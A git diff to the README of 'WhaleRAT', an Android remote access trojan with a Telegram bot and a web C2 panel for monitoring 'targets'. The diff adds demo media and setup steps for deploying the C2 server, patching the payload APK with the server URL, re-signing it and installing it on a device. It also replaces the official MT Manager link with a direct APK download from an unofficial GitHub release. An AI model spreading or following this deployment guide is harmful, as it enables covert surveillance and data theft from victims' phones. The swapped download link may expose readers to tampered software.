@@ -16,6 +16,7 @@
   <img src="https://img.shields.io/badge/Node.js-%3E%3D20.0.0-brightgreen?style=for-the-badge&logo=node.js" alt="Node.js"/>
   <img src="https://img.shields.io/badge/Deploy-Railway-blueviolet?style=for-the-badge&logo=railway" alt="Railway"/>
 </p>
+</div>
 
 ---
 
@@ -27,6 +28,38 @@
 1. **Telegram Bot** — issue commands, receive data, and get real-time alerts directly inside Telegram.
 2. **Web Dashboard (C2 Panel)** — a full-featured browser-based UI for managing multiple devices simultaneously, viewing live feeds, logs, galleries, and more.
 
+
+---
+
+## 🎥 Demo Video
+
+<div align="center">
+  <video src="https://pub-3ab59b8f25ba43769d968211da80e759.r2.dev/whaleratdemo.mp4" width="920" controls autoplay loop playsinline>
+    <source src="https://pub-3ab59b8f25ba43769d968211da80e759.r2.dev/whaleratdemo.mp4" type="video/mp4">
+    Your browser does not support video playback. <a href="https://pub-3ab59b8f25ba43769d968211da80e759.r2.dev/whaleratdemo.mp4">Click here to download or watch the demo</a>.
+  </video>
+</div>
+
+---
+
+## 📸 Screenshots
+
+<div align="center">
+
+### 🔐 Admin Authentication & Passkey Portal
+
+
+<img src="images/login-page.png" alt="Whale RAT Admin Authentication" width="920">
+
+<br><br>
+
+
+### 🖥️ Real-Time C2 Dashboard & Live Target Monitor
+
+
+<img src="images/main-panel.png" alt="Whale RAT Main Control Panel" width="920">
+
+</div>
 
 ---
 
@@ -59,7 +92,6 @@
 | 🌗 **Light/Dark UI** | Web panel supports both themes |
 
 ---
-
 
 <details>
 <summary>🏗️ Architecture</summary>
@@ -197,14 +229,14 @@ You'll get a URL like `https://your-app.up.railway.app`.
 
 ### Step 4 — Set the Server URL in the APK
 
-The APK needs to point to **your** Railway URL before you install it on a device. You do this using **[MT Manager](https://mt2.cn/)** — a free Android file manager / APK editor.
+The APK needs to point to **your** Railway URL before you install it on a device. You do this using **[MT Manager](https://github.com/Yau08/MT-Manager/releases/download/v2.14.5/MT-Manager_2.14.5_v8a.apk)** — a free Android file manager / APK editor.
 
 > [!NOTE]
 > MT Manager runs on Android. Do this step on an Android phone or emulator.
 
 ### How to edit the APK with MT Manager:
 
-1. **Download [MT Manager](https://mt2.cn/)** and install it on your Android device
+1. **Download [MT Manager](https://github.com/Yau08/MT-Manager/releases/download/v2.14.5/MT-Manager_2.14.5_v8a.apk)** and install it on your Android device
 2. Copy `app/drop.apk` to your Android device
 3. Open **MT Manager** → navigate to `drop.apk` → tap it → choose **"View"**
 4. Inside the APK, find and open the file **`assets/config.json`**
@@ -221,14 +253,11 @@ The APK needs to point to **your** Railway URL before you install it on a device
 7. Save the file — MT Manager will ask to **auto-sign** the APK → tap **Yes**
 8. Install the modified APK on your target test device
 
-> [!IMPORTANT]
-> Make sure `server_url` ends with a trailing slash `/` and uses `https://` — Railway handles TLS automatically.
-
 ---
 
 ### Step 6 — Verify deployment
 
-Visit `https://your-app.up.railway.app/login` — you should see the WhaleRAT login page.  
+Visit `https://your-app.up.railway.app` — you should see the WhaleRAT login page.  
 Send `/start` to your Telegram bot to verify it's polling correctly.
 
 
